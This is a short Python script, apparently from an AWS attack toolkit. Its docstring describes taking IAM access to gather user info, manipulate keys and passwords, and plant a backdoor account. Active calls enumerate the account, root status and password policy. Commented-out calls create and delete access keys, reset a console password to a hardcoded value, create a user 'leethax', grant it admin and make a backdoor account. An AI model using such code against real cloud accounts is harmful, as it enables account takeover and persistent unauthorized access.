'''
if you have root or IAM access gather user info, manipulate access keys or passwords, make backdoor account
'''
from libs.iam import *
from libs.sts import *
from config import AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY

get_accountid(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY)
check_root_account(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY)
get_password_policy(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY)
#create_access_key(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY,'pythons3')
#delete_access_key(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY,'pythons3', 'AKIAIJV3RQMOYM7WQS2Q')
#change_user_console_password(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, 'pythons3', 'PS#EDCasd123456!@')
#create_user(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY,'leethax')
#make_admin(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY,'leethax')
#make_backdoor_account(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY,'leethax','PS#EDCasd123456!@')
